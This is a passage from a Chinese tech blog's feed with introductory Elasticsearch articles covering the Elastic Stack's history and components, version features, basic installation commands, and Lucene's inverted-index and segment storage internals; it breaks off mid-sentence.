CPU、内存和带宽。因为这个原因，所以强烈建议慎重使用深翻。</p><p>分片可以减少每个片上的数据量，加快查询的速度，但是在查询时，协调节点要在收集数 (from+size)×n 条数据后再做一次全局排序。</p><p>若这个数据量很大，则也会占用大量的 CPU、内存、带宽等，并且分片查询的速度取决于最慢的分片查询的速度，所以分片数并不是越多越好。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>《Elasticsearch核心技术与实战》</li></ul><style>  img {    zoom: 50%;  }</style>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Elasticsearch 是使用 Java 编写的一种开源搜索引擎，它在内部使用 Luence 做索引与搜索，通过对 Lucene 的封装，提供了一套简单一致的 RESTful API。&lt;/p&gt;
&lt;p&gt;Elasticsearch 也是一种分布式的搜索引擎架构，可以很简单地扩展到上百个服务节点，并支持 PB 级别的数据查询，使系统具备高可用和高并发性。&lt;/p&gt;
&lt;p&gt;本文介绍 Elasticsearch 核心概念和索引写入过程。&lt;/p&gt;
    
    </summary>
    
    
      <category term="BigData" scheme="https://xinlichao.cn/categories/BigData/"/>
    
    
      <category term="Elastic Stack" scheme="https://xinlichao.cn/tags/Elastic-Stack/"/>
    
      <category term="ES" scheme="https://xinlichao.cn/tags/ES/"/>
    
  </entry>
  
  <entry>
    <title>重学 Elastic Stack 之 Elasticsearch 简介</title>
    <link href="https://xinlichao.cn/back-end/big-data/es-01/"/>
    <id>https://xinlichao.cn/back-end/big-data/es-01/</id>
    <published>2021-01-30T09:25:00.000Z</published>
    <updated>2021-02-26T10:23:44.666Z</updated>
    
    <content type="html"><![CDATA[<p>Elasticsearch 是一个基于 Lucene 的搜索引擎。基于 Lucene ，超越 Lucene。它提供了一个分布式多用户能力的全文搜索引擎，基于 RESTful web 接口。Elasticsearch 是用 Java 开发的，并作为 Apache 许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到近实时搜索，稳定，可靠，快速。</p><a id="more"></a><h2 id="Elasticsearch-简介及其发展历史"><a href="#Elasticsearch-简介及其发展历史" class="headerlink" title="Elasticsearch 简介及其发展历史"></a>Elasticsearch 简介及其发展历史</h2><h3 id="从开源到上市"><a href="#从开源到上市" class="headerlink" title="从开源到上市"></a>从开源到上市</h3><ul><li>Elastic Inc - 开源软件 / 上市公司</li><li>当前市值超过 50 亿美金，开盘当天涨幅达 94%</li><li>Elasticsearch 软件下载量，超 3.5 亿次</li><li>10 万＋ 的社区成员</li><li>7200＋ 订阅用户，分布在 100＋ 国家</li><li>云服务 - Elastic，Amazon，阿里巴巴，腾讯</li></ul><p><img src="/images/big-data/es-01/1.jpg" alt="1"></p><p><a href="https://www.elastic.co/cn/blog/ze-bell-has-rung-thank-you-users-customers-and-partners" target="_blank" rel="noopener">2018年10月纽交所上市</a></p><p><img src="/images/big-data/es-01/2.jpg" alt="2"></p><p><a href="https://db-engines.com/en/ranking" target="_blank" rel="noopener">https://db-engines.com/en/ranking</a></p><h3 id="起源-Lucene"><a href="#起源-Lucene" class="headerlink" title="起源 - Lucene"></a>起源 - Lucene</h3><ul><li>基于 Java 语言开发的搜索引擎库类</li><li>创建于1999年，2005年成为 Apache顶级开源项目</li><li>Lucene 具有高性能、易扩展的优点</li><li>Lucene 的局限性∶<ul><li>只能基于 Java 语言开发</li><li>类库的接口学习曲线陡峭</li><li>原生并不支持水平扩展</li></ul></li></ul><p><img src="/images/big-data/es-01/3.jpg" alt="3"></p><h3 id="Elasticsearch-的诞生"><a href="#Elasticsearch-的诞生" class="headerlink" title="Elasticsearch 的诞生"></a>Elasticsearch 的诞生</h3><p>许多年前，一个刚结婚的名叫 Shay Banon 的失业开发者，跟着他的妻子去了伦敦，他的妻子在那里学习厨师。 在寻找一个赚钱的工作的时候，为了给他的妻子做一个食谱搜索引擎，他开始使用 Lucene 的一个早期版本。</p><p>直接使用 Lucene 是很难的，因此 Shay 开始做一个抽象层，Java 开发者使用它可以很简单的给他们的程序添加搜索功能。 他发布了他的第一个开源项目 Compass。</p><p>后来 Shay 获得了一份工作，主要是高性能，分布式环境下的内存数据网格。这个对于高性能，实时，分布式搜索引擎的需求尤为突出， 他决定重写 Compass，把它变为一个独立的服务并取名 Elasticsearch。</p><p>第一个公开版本在2010年2月发布，从此以后，Elasticsearch 已经成为了 Github 上最活跃的项目之一，他拥有超过300名 contributors(目前736名 contributors )。 一家公司已经开始围绕 Elasticsearch 提供商业服务，并开发新的特性，但是，Elasticsearch 将永远开源并对所有人可用。</p><p>据说，Shay 的妻子还在等着她的食谱搜索引擎…​</p><ul><li>2004年 Shay Banon 基于Lucene开发了Compass</li><li>2010年 Shay Banon重写了Compass，取名Elasticsearch<ul><li>支持分布式，可水平扩展</li><li>降低全文检索的学习曲线，可以被任何编程语言调用</li></ul></li></ul><p><img src="/images/big-data/es-01/4.jpg" alt="4"></p><blockquote><p>Search is something that any application should have.</p></blockquote><h3 id="Elasticsearch-的用途"><a href="#Elasticsearch-的用途" class="headerlink" title="Elasticsearch 的用途"></a>Elasticsearch 的用途</h3><p>Elasticsearch 在速度和可扩展性方面都表现出色，而且还能够索引多种类型的内容，这意味着其可用于多种用例：</p><ul><li>应用程序搜索</li><li>网站搜索</li><li>企业搜索</li><li>日志处理和分析</li><li>基础设施指标和容器监测</li><li>应用程序性能监测</li><li>地理空间数据分析和可视化</li><li>安全分析</li><li>业务分析  </li></ul><h3 id="Elasticsearch-的分布式架构"><a href="#Elasticsearch-的分布式架构" class="headerlink" title="Elasticsearch 的分布式架构"></a>Elasticsearch 的分布式架构</h3><ul><li>集群规模可以从单个扩展至数百个节点，处理PB级数据</li><li>高可用 &amp; 水平扩展<ul><li>服务和数据两个纬度</li></ul></li><li>支持不同的节点类型<ul><li>支持 Hot &amp; Warm 架构</li></ul></li></ul><p><img src="/images/big-data/es-01/5.jpg" alt="5"></p><h3 id="支持多种方式集成接入"><a href="#支持多种方式集成接入" class="headerlink" title="支持多种方式集成接入"></a>支持多种方式集成接入</h3><ul><li><a href="https://www.elastic.co/guide/en/elasticsearch/client/index.html" target="_blank" rel="noopener">多种编程语言的类库</a><ul><li>Java /.NET / Python / Ruby / PHP/ Groowy / Perl</li></ul></li><li>RESTful API v.s Transport API<ul><li>9200 v.s 9300（建议使用RESTful API）</li></ul></li><li>JDBC &amp; ODBC</li></ul><h3 id="Elasticsearch-的主要功能"><a href="#Elasticsearch-的主要功能" class="headerlink" title="Elasticsearch 的主要功能"></a>Elasticsearch 的主要功能</h3><ul><li>海量数据的分户式存储以及集群管理<ul><li>服务与数据的高可用，水平扩展</li></ul></li><li>近实时搜索，性能卓越<ul><li>结构化/全文/地理位置/自动完成</li></ul></li><li>海量数据的近实时分析<ul><li>聚合功能</li></ul></li></ul><h3 id="Elastic-Stack-生态圈"><a href="#Elastic-Stack-生态圈" class="headerlink" title="Elastic Stack 生态圈"></a>Elastic Stack 生态圈</h3><p><img src="/images/big-data/es-01/6.jpg" alt="6"></p><h4 id="Logstash∶-数据处理管道"><a href="#Logstash∶-数据处理管道" class="headerlink" title="Logstash∶ 数据处理管道"></a>Logstash∶ 数据处理管道</h4><ul><li>开源的服务器端数据处理管道，支持从不同来源采集数据，转换数据，并将数据发送到不同的存储库中</li><li>Logstash 诞生于 2009年，最初用来做日志的采集与处理</li><li>Logstash 创始人 Jordan Sisel</li><li>2013 年被 Elasticsearch 收购</li></ul><p><img src="/images/big-data/es-01/11.jpg" alt="11"></p><blockquote><p>Remember: if a new user has a bad time, it’s a bug in logstash</p></blockquote><p><strong>Logstash 特性</strong></p><ul><li>实时解析和转换数据<ul><li>从 IP 地址破译出地理坐标</li><li>将 Pl 数据匿名化，完全排除敏感字段</li></ul></li><li>可扩展<ul><li>200 多个插件（日志/数据库/Arcsigh/Netflow）</li></ul></li><li>可靠性安全性。<ul><li>Logstash 会通过持久化队列来保证至少将运行中的事件送达一次</li><li>数据传输加密</li></ul></li><li>监控</li></ul><h4 id="Kibana∶-可视化分析利器"><a href="#Kibana∶-可视化分析利器" class="headerlink" title="Kibana∶ 可视化分析利器"></a>Kibana∶ 可视化分析利器</h4><ul><li>Kibana 名字的含义=Kiwifruit+Banana</li><li>数据可视化工具，帮助用户解开对数据的任何疑问</li><li>基于Logstash的工具，2013年加入Elastic公司</li></ul><p><img src="/images/big-data/es-01/12.jpg" alt="12"></p><h4 id="Elastic-的发展"><a href="#Elastic-的发展" class="headerlink" title="Elastic 的发展"></a>Elastic 的发展</h4><ul><li>2015 年 3 月收购 Elastic Cloud，提供 Cloud 服务</li><li>2015 年 3 月收购 PacketBeat</li><li>2016 年 9 月收购 PreAlert-Machine Learning 异常检测</li><li>2017 年 6 月收购 Opbeat 进军 APM</li><li>2017年11月收购 SaaS 厂商 Swiftype，提供网站和 App搜索</li><li>2018 年X-Pack 开源</li></ul><h4 id="BEATS-轻量的数据采集器"><a href="#BEATS-轻量的数据采集器" class="headerlink" title="BEATS - 轻量的数据采集器"></a>BEATS - 轻量的数据采集器</h4><p><img src="/images/big-data/es-01/13.jpg" alt="13"></p><ul><li>由 Go 语言开发</li><li>提供了很多轻量级抓包工具</li></ul><h4 id="X-Pack∶-商业化套件"><a href="#X-Pack∶-商业化套件" class="headerlink" title="X-Pack∶ 商业化套件"></a>X-Pack∶ 商业化套件</h4><ul><li>6.3 之前的版本，X-Pack 以插件方式安装</li><li>X-Pack 开源之后，Elasticsearch &amp; Kibana 支持 OSS 版和 Basic 两种版本<ul><li>部分 X-Pack 功能支持免费使用，6.8 和 7.1 开始，Security 功能免费</li></ul></li><li>OSS，Basic，黄金级，白金级</li><li><a href="https://www.elastic.co/cn/subscriptions" target="_blank" rel="noopener">https://www.elastic.co/cn/subscriptions</a></li></ul><p><img src="/images/big-data/es-01/14.jpg" alt="14"></p><h3 id="ELK-应用场景"><a href="#ELK-应用场景" class="headerlink" title="ELK 应用场景"></a>ELK 应用场景</h3><ul><li>网站搜索/垂直搜索/代码搜索</li><li>日志管理与分析/安全指标监控/应用性能监控/WEB抓取舆情分</li></ul><h4 id="日志的重要性"><a href="#日志的重要性" class="headerlink" title="日志的重要性"></a>日志的重要性</h4><ul><li>为什么重要<ul><li>运维∶ 医生给病人看病。日志就是病人对自己的陈述</li><li>恶意攻击，恶意注册，刷单，恶意密码猜测</li></ul></li><li>挑战<ul><li>关注点很多，任何一个点都有可能引起问题</li><li>日志分散在很多机器，出了问题时，才发现日志被删了</li><li>很多运维人员是消防员，哪里有问题去哪里</li></ul></li></ul><p><img src="/images/big-data/es-01/7.jpg" alt="7"></p><h4 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a>日志管理</h4><p><img src="/images/big-data/es-01/15.jpg" alt="15"></p><h4 id="Elastichsearch与数据库的集成"><a href="#Elastichsearch与数据库的集成" class="headerlink" title="Elastichsearch与数据库的集成"></a>Elastichsearch与数据库的集成</h4><ul><li>单独使用 Elasticsearch 存储</li><li>以下情况可考虑与数据库集成<ul><li>与现有系统的集成</li><li>需考虑事务性</li><li>数据更新频繁</li></ul></li></ul><p><img src="/images/big-data/es-01/8.jpg" alt="8"></p><h4 id="指标分析-日志分析"><a href="#指标分析-日志分析" class="headerlink" title="指标分析/日志分析"></a>指标分析/日志分析</h4><p><img src="/images/big-data/es-01/9.jpg" alt="9"></p><h3 id="Elastic-产品生命周期结束-EOL-日期"><a href="#Elastic-产品生命周期结束-EOL-日期" class="headerlink" title="Elastic 产品生命周期结束 (EOL) 日期"></a>Elastic 产品生命周期结束 (EOL) 日期</h3><p><a href="https://www.elastic.co/cn/support/eol" target="_blank" rel="noopener">https://www.elastic.co/cn/support/eol</a></p><h4 id="新特性-5-x"><a href="#新特性-5-x" class="headerlink" title="新特性 5.x"></a>新特性 5.x</h4><ul><li>Lucene 6.x，性能提升，默认打分机制从 TF-IDF 改为 BM 25</li><li>支持Ingest节点/Painless Scripting /Completion suggested 支持/原生的Java REST客户端</li><li>Type 标记成 deprecated，支持了 Keyword 的类型</li><li>性能优化<ul><li>内部引擎移除了避免同一文档并发更新的竞争锁，带来 15% — 20% 的性能提升</li><li>Instant aggregation，支持分片上聚合的缓存</li><li>新增了 Profile API</li></ul></li></ul><h4 id="新特性-6-×"><a href="#新特性-6-×" class="headerlink" title="新特性 6.×"></a>新特性 6.×</h4><ul><li>Lucene 7.x</li><li>新功能<ul><li>跨集群复制（CCR）</li><li>索引生命周期管理</li><li>SQL 的支持</li></ul></li><li>更友好的的升级及数据迁移<ul><li>在主要版本之间的迁移更为简化，体验升级</li><li>全新的基于操作的数据复制框架，可加快恢复数据</li></ul></li><li>性能优化<ul><li>有效存储稀疏字段的新方法，降低了存储成本</li><li>在索引时进行排序，可加快排序的查询性能</li></ul></li></ul><h4 id="新特性-7-x"><a href="#新特性-7-x" class="headerlink" title="新特性 7.x"></a>新特性 7.x</h4><ul><li>Lucene 8.0</li><li>重大改进-正式废除单个索引下多 Type 的支持</li><li>7.1 开始，Security 功能免费使用</li><li>ECK-Elasticseach Operator on Kubernetes</li><li>新功能<ul><li>New Cluster coordination</li><li>Feature-Complete High Level REST Client o Script Score Query</li></ul></li><li>性能优化<ul><li>默认的 Primary Shard 数从5改为1，避免 Over Sharding</li><li>性能优化，更快的 Top K</li></ul></li></ul><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>Elasticsearch 是一个开源的分布式搜索与分析引擎，提供了近实时搜索和聚合两大功能。</li><li>Elastic Stack 围绕着 ELKB 构建出一套生态系统，适合大量的应用场景。</li><li>Elastic 公司通过并购，向用户提供 ML，APM，网站搜索等服务。</li><li>Elastic Stack 包括 Elasticsearch，Kibana，Logstash，Beats 等一系列产品。<ul><li>Elasticsearch 是核心引擎，提供了海量数据存储，搜索和聚合的能力。Beats 是轻量的数据采集器，Logstash用来做数据转换，Kibana 则提供了丰富的可视化展现与分析的功能。</li></ul></li><li>Elastic Stack 主要被广泛使用于∶搜索，日志管理，安全分析，指标分析，业务分析，应用性能监控等多个领域</li><li>Elastic Stack 开源了X-Pack在内的相关代码。作为商业解决方案，X-Pack的部分功能需要收费。Elastic 公司从6.8 和 7.1 开始，Security 功能也可以免费使用，（基础版免费）。</li><li>相比关系型数据库，Elasticsearch 提供了如模糊查询，搜索条件的算分第等关系型数据库所不擅长的功能，但是在事务性等方面，也不如关系型数据库来的强大。因此，在实际生产环境中，需要考虑具体业务要求，综合使用。</li></ul><h2 id="Elasticsearch-7-3-安装与简单配置"><a href="#Elasticsearch-7-3-安装与简单配置" class="headerlink" title="Elasticsearch 7.3 安装与简单配置"></a>Elasticsearch 7.3 安装与简单配置</h2><p>建议在 Docker 容器中运行 ES，Kibana 和 Cerebro，详情见 <a href="/back-end/docker/docker-elk">Elastic stack (ELK) on Docker</a></p><blockquote><p>基于 7.3 版本</p></blockquote><h3 id="安装-Java"><a href="#安装-Java" class="headerlink" title="安装 Java"></a>安装 Java</h3><ul><li>运行 Elastiosearch，需安装并配置 JDK<ul><li>设置 $JAVA_HOME</li></ul></li><li>各个版本对 Java 的依赖<ul><li>Elasticsearch 5 需要 Java 8 以上的版本</li><li>Elasticsearch 从6.5 开始支持 Java 11</li><li><a href="https://www.elastic.co/cn/support/matrix#matrix_jvm" target="_blank" rel="noopener">https://www.elastic.co/cn/support/matrix#matrix_jvm</a></li><li>7.0 开始，内置了 Java 环境</li></ul></li></ul><blockquote><p>二进制安装：<a href="https://www.elastic.co/cn/downloads/elasticsearch" target="_blank" rel="noopener">https://www.elastic.co/cn/downloads/elasticsearch</a></p></blockquote><h3 id="Elasticsearch-的文件目录结构"><a href="#Elasticsearch-的文件目录结构" class="headerlink" title="Elasticsearch 的文件目录结构"></a>Elasticsearch 的文件目录结构</h3><!-- ![10][10] --><table><thead><tr><th align="center">目录</th><th align="center">配置文件</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">bin</td><td align="center"></td><td align="center">脚本文件，包括启动 elasticsearch, 安装插件。运行统计数据等</td></tr><tr><td align="center">config</td><td align="center">elasticsearch.yml</td><td align="center">集群配置文件，user, role based 相关配置</td></tr><tr><td align="center">JDK</td><td align="center"></td><td align="center">Java 运行坏境</td></tr><tr><td align="center">data</td><td align="center">path.data</td><td align="center">数据文件</td></tr><tr><td align="center">lib</td><td align="center"></td><td align="center">Java 类库</td></tr><tr><td align="center">logs</td><td align="center">path.log</td><td align="center">日志文件</td></tr><tr><td align="center">modules</td><td align="center"></td><td align="center">包含所有ES模块</td></tr><tr><td align="center">plugins</td><td align="center"></td><td align="center">包含所有已安装插件</td></tr></tbody></table><h3 id="JVM-配置"><a href="#JVM-配置" class="headerlink" title="JVM 配置"></a>JVM 配置</h3><ul><li>修改 JVM - config/jvm.options<ul><li>7.1 下载的默认设置是 1 GB</li></ul></li><li>配置的建议<ul><li>Xmx 和 Xms 设置 成一样</li><li>Xmx 不要超过机器内存的 50%</li><li>不要超过 30GB - <a href="https://www.elastic.co/blog/a-heap-of-trouble" target="_blank" rel="noopener">https://www.elastic.co/blog/a-heap-of-trouble</a></li></ul></li></ul><h3 id="启动单节点"><a href="#启动单节点" class="headerlink" title="启动单节点"></a>启动单节点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载并运行单个 Elasticsearch 实例</span></span><br><span class="line"><span class="comment"># 通过 -E 设定合适的参数</span></span><br><span class="line">bin/elasticsearch -E node.name=node0 -E cluster.name=demo-cluster -E path.data=node0_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问：http://localhost:9200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装插件 </span></span><br><span class="line"><span class="comment"># https://www.elastic.co/guide/en/elasticsearch/plugins/current/intro.html</span></span><br><span class="line">bin/elasticsearch-plugin install analysis-icu</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看插件</span></span><br><span class="line">bin/elasticsearch-plugin list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看安装的插件</span></span><br><span class="line">GET http://localhost:9200/_cat/plugins?v</span><br></pre></td></tr></table></figure><h3 id="单节点运行多个实例"><a href="#单节点运行多个实例" class="headerlink" title="单节点运行多个实例"></a>单节点运行多个实例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在单节点上运行集群</span></span><br><span class="line">bin/elasticsearch -E node.name=node0 -E cluster.name=demo-cluster -E path.data=node0_data</span><br><span class="line">bin/elasticsearch -E node.name=node1 -E cluster.name=demo-cluster -E path.data=node1_data</span><br><span class="line">bin/elasticsearch -E node.name=node2 -E cluster.name=demo-cluster -E path.data=node2_data</span><br><span class="line">bin/elasticsearch -E node.name=node3 -E cluster.name=demo-cluster -E path.data=node3_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看集群</span></span><br><span class="line">GET http://localhost:9200</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看nodes</span></span><br><span class="line">GET _cat/nodes</span><br><span class="line">GET _cluster/health</span><br></pre></td></tr></table></figure><h3 id="Kibana-安装"><a href="#Kibana-安装" class="headerlink" title="Kibana 安装"></a>Kibana 安装</h3><p><a href="https://www.elastic.co/cn/downloads/kibana" target="_blank" rel="noopener">https://www.elastic.co/cn/downloads/kibana</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动kibana</span></span><br><span class="line">bin/kibana</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问：http://localhost:5601</span></span><br><span class="line"><span class="comment"># 常用 Dev Tool 控制台用于操控 ES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看插件</span></span><br><span class="line"><span class="comment"># https://www.elastic.co/guide/en/kibana/current/known-plugins.html</span></span><br><span class="line">bin/kibana-plugin list</span><br></pre></td></tr></table></figure><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="搜索引擎开源项目"><a href="#搜索引擎开源项目" class="headerlink" title="搜索引擎开源项目"></a>搜索引擎开源项目</h3><ul><li><a href="https://lucene.apache.org/" target="_blank" rel="noopener">Lucene</a> 大名鼎鼎的搜索引擎类库，如果使用该技术实现，需要对 Lucene 的 API 和底层原理非常了解，而且需要编写大量的 Java 代码；</li><li><a href="http://lucene.apache.org/solr/" target="_blank" rel="noopener">Solr</a> 基于 Lucene 使用 Java 实现的一个 Web 应用，可以使用 REST 方式的 HTTP 请求，进行远程 API 的调用；</li><li><a href="https://www.elastic.co/cn/" target="_blank" rel="noopener">Elasticsearch</a> 基于 Lucene ，超越 Lucene，可以使用 REST 方式的 HTTP 请求，进行远程 API 的调用。</li></ul><h3 id="Solr-vs-Elasticsearch"><a href="#Solr-vs-Elasticsearch" class="headerlink" title="Solr vs Elasticsearch"></a>Solr vs Elasticsearch</h3><ul><li>Solr 利用 Zookeeper 进行分布式管理，而 Elasticsearch 自身带有分布式协调管理功能；</li><li>Solr 支持更多格式的数据，而 Elasticsearch 仅支持json文件格式；</li><li>Solr 官方提供的功能更多，而 Elasticsearch 本身更注重于核心功能，高级功能都由第三方插件提供；</li><li>Solr 在传统的搜索应用中表现好于 Elasticsearch，但在处理实时搜索应用时效率明显低于 Elasticsearch；</li><li>Solr 是传统搜索应用的有力解决方案，但 Elasticsearch 更适用于新兴的实时搜索应用。</li></ul><h3 id="Lucene"><a href="#Lucene" class="headerlink" title="Lucene"></a>Lucene</h3><h4 id="Lucene-简介"><a href="#Lucene-简介" class="headerlink" title="Lucene 简介"></a>Lucene 简介</h4><p>Lucene 是一种高性能、可伸缩的信息搜索（IR）库，在 2000 年开源，最初由鼎鼎大名的 Doug Cutting 开发，是基于 Java 实现的高性能的开源项目。</p><p>Lucene 采用了基于倒排表的设计原理，可以非常高效地实现文本查找，在底层采用了分段的存储模式，使它在读写时几乎完全避免了锁的出现，大大提升了读写性能。</p><h4 id="核心模块"><a href="#核心模块" class="headerlink" title="核心模块"></a>核心模块</h4><p>Lucene 的写流程和读流程如下图所示：</p><p><img src="/images/big-data/es-01/16.jpg" alt="16"></p><p>其中，虚线箭头（a、b、c、d）表示写索引的主要过程，实线箭头（1-9）表示查询的主要过程。</p><p>Lucene 中的主要模块及模块说明如下：</p><ul><li>analysis：主要负责词法分析及语言处理，也就是我们常说的分词，通过该模块可最终形成存储或者搜索的最小单元 Term。</li><li>index 模块：主要负责索引的创建工作。</li><li>store 模块：主要负责索引的读写，主要是对文件的一些操作，其主要目的是抽象出和平台文件系统无关的存储。</li><li>queryParser 模块：主要负责语法分析，把我们的查询语句生成 Lucene 底层可以识别的条件。</li><li>search 模块：主要负责对索引的搜索工作。</li><li>similarity 模块：主要负责相关性打分和排序的实现</li></ul><h4 id="核心术语"><a href="#核心术语" class="headerlink" title="核心术语"></a>核心术语</h4><p>下面介绍 Lucene 中的核心术语：</p><ul><li><p><strong>Term</strong>：是索引里最小的存储和查询单元，对于英文来说一般是指一个单词，对于中文来说一般是指一个分词后的词。</p></li><li><p><strong>词典（Term Dictionary，也叫作字典）</strong>：是 Term 的集合。词典的数据结构可以有很多种，每种都有自己的优缺点。</p><ul><li><p>比如：排序数组通过二分查找来检索数据：HashMap（哈希表）比排序数组的检索速度更快，但是会浪费存储空间。</p></li><li><p>FST (finite-state transducer) 有更高的数据压缩率和查询效率，因为词典是常驻内存的，而 FST 有很好的压缩率，所以 FST 在 Lucene 的最新版本中有非常多的使用场景，也是默认的词典数据结构。</p></li></ul></li><li><p><strong>倒排序（Posting List）</strong>：一篇文章通常由多个词组成，倒排表记录的是某个词在哪些文章中出现过。</p></li><li><p><strong>正向信息</strong>：原始的文档信息，可以用来做排序、聚合、展示等。</p></li><li><p><strong>段（Segment）</strong>：索引中最小的独立存储单元。一个索引文件由一个或者多个段组成。在 Luence 中的段有不变性，也就是说段一旦生成，在其上只能有读操作，不能有写操作。</p></li></ul><p>Lucene 的底层存储格式如下图所示，由词典和倒排序两部分组成，其中的词典就是 Term 的集合：</p><p><img src="/images/big-data/es-01/17.jpg" alt="17"></p><p>词典中的 Term 指向的文档链表的集合，叫做倒排表。词典和倒排表是 Lucene 中很重要的两种数据结构，是实现快速检索的重要基石。</p><p>词典和倒排表是分两部分存储的，在倒排序中不但存储了文档编号，还存储了词频等信息。</p><p>在上图所示的词典部分包含三个词条（Term）：Elasticsearch、Lucene 和 Solr。词典数据是查询的入口，所以这部分数据是以 FST 的形式存储在内存中的。</p><p>在倒排表中，“Lucene” 指向有序链表 3，7，15，30，35，67，表示字符串 “Lucene” 在文档编号为 3、7、15、30、35、67 的文章中出现过，Elasticsearch 和 Solr 同理。</p><h4 id="检索方式"><a href="#检索方式" class="headerlink" title="检索方式"></a>检索方式</h4><p>在 Lucene 的查询过程中的主要检索方式有以下四种：</p><p><strong>单个词查询</strong></p><p>指对一个 Term 进行查询。比如，若要查找包含字符串 “Lucene” 的文档，则只需在词典中找到 Term “Lucene”，再获得在倒排表中对应的文档链表即可。</p><p><strong>AND</strong></p><p>指对多个集合求交集。比如，若要查找既包含字符串 “Lucene” 又包含字符串 “Solr” 的文档，则查找步骤如下：</p><ul><li>在词典中找到 Term “Lucene”，得到 “Lucene” 对应的文档链表。</li><li>在词典中找到 Term “Solr”，得到 “Solr” 对应的文档链表。</li><li>合并链表，对两个文档链表做交集运算，合并后的结果既包含 “Lucene” 也包含 “Solr”。</li></ul><p><strong>OR</strong></p><p>指多个集合求并集。比如，若要查找包含字符串 “Luence” 或者包含字符串 “Solr” 的文档，则查找步骤如下：</p><ul><li>在词典中找到 Term “Lucene”，得到 “Lucene” 对应的文档链表。</li><li>在词典中找到 Term “Solr”，得到 “Solr” 对应的文档链表。</li><li>合并链表，对两个文档链表做并集运算，合并后的结果包含 “Lucene” 或者包含 “Solr”。</li></ul><p><strong>NOT</strong></p><p>指对多个集合求差集。比如，若要查找包含字符串 “Solr” 但不包含字符串 “Lucene” 的文档，则查找步骤如下：</p><ul><li>在词典中找到 Term “Lucene”，得到 “Lucene” 对应的文档链表。</li><li>在词典中找到 Term “Solr”，得到 “Solr” 对应的文档链表。</li><li>合并链表，对两个文档链表做差集运算，用包含 “Solr” 的文档集减去包含 “Lucene” 的文档集，运算后的结果就是包含 “Solr” 但不包含 “Lucene”。</li></ul><p>通过上述四种查询方式，我们不难发现，由于 Lucene 是以倒排表的形式存储的。</p><p>所以在 Lucene 的查找过程中只需在词典中找到这些 Term，根据 Term 获得文档链表，然后根据具体的查询条件对链表进行交、并、差等操作，就可以准确地查到我们想要的结果。</p><p>相对于在关系型数据库中的 “Like” 查找要做全表扫描来说，这种思路是非常高效的。</p><p>虽然在索引创建时要做很多工作，但这种一次生成、多次使用的思路也是非常高明的。</p><h4 id="分段存储"><a href="#分段存储" class="headerlink" title="分段存储"></a>分段存储</h4><p>在早期的全文检索中为整个文档集合建立了一个很大的倒排索引，并将其写入磁盘中，如果索引有更新，就需要重新全量创建一个索引来替换原来的索引。</p><p>这种方式在数据量很大时效率很低，并且由于创建一次索引的成本很高，所以对数据的更新不能过于频繁，也就不能保证实效性。</p><p>现在，在搜索中引入了段的概念（将一个索引文件拆分为多个子文件，则每个子文件叫做段），每个段都是一个独立的可被搜索的数据集，并且段具有不变性，一旦索引的数据被写入硬盘，就不可修改。</p><p>在分段的思想下，对数据写操作的过程如下：</p><ul><li>新增：当有新的数据需要创建索引时，由于段段不变性，所以选择新建一个段来存储新增的数据。</li><li>删除：当需要删除数据时，由于数据所在的段只可读，不可写，所以 Lucene 在索引文件新增一个 .del 的文件，用来专门存储被删除的数据 id。</li><li>当查询时，被删除的数据还是可以被查到的，只是在进行文档链表合并时，才把已经删除的数据过滤掉。被删除的数据在进行段合并时才会被真正被移除。</li><li>更新：更新的操作其实就是删除和新增的组合，先在.del 文件中记录旧数据，再在新段中添加一条更新后的数据。</li></ul><p>段不可变性的优点如下：</p><ul><li>不需要锁：因为数据不会更新，所以不用考虑多线程下的读写不一致情况。</li><li>可以常驻内存：段在被加载到内存后，由于具有不变性，所以只要内存的空间足够大，就可以长时间驻存，大部分查询请求会直接访问内存，而不需要访问磁盘，使得查询的性能有很大的提升。</li><li>缓存友好：在段的声明周期内始终有效，不需要在每次数据更新时被重建。</li><li>增量创建：分段可以做到增量创建索引，可以轻量级地对数据进行更新，由于每次创建的成本很低，所以可以频繁地更新数据，使系统接近实时更新。</li></ul><p>段不可变性的缺点如下：</p><ul><li>删除：当对数据进行删除时，旧数据不会被马上删除，而是在 .del 文件中被标记为删除。而旧数据只能等到段更新时才能真正地被移除，这样会有大量的空间浪费。</li><li>更新：更新数据由删除和新增这两个动作组成。若有一条数据频繁更新，则会有大量的空间浪费。</li><li>新增：由于索引具有不变性，所以每次新增数据时，都需要新增一个段来存储数据。当段段数量太多时，对服务器的资源（如文件句柄）的消耗会非常大，查询的性能也会受到影响。</li><li>过滤：在查询后需要对已经删除的旧数据进行过滤，这增加了查询的负担。</li></ul><p>为了提升写的性能，Lucene 